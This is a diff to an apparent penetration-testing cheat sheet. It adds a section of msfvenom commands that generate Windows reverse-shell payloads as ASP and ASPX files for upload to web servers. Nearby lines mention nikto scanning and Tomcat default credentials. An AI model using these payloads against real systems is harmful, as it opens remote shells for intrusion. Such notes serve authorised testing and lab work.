@@ -28,6 +28,16 @@
 
 <code>nikto -h [URL]</code>
 
+### ASP / ASP.NET
+
+ASP Paylod: <code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f asp > shell.asp</code>
+
+ASP.NET Payload: 
+
+<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f aspx > shell.aspx</code>
+
+<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f asp-exe > shell.aspx</code>
+
 ### Tomcat
 
 #### Default Credentials
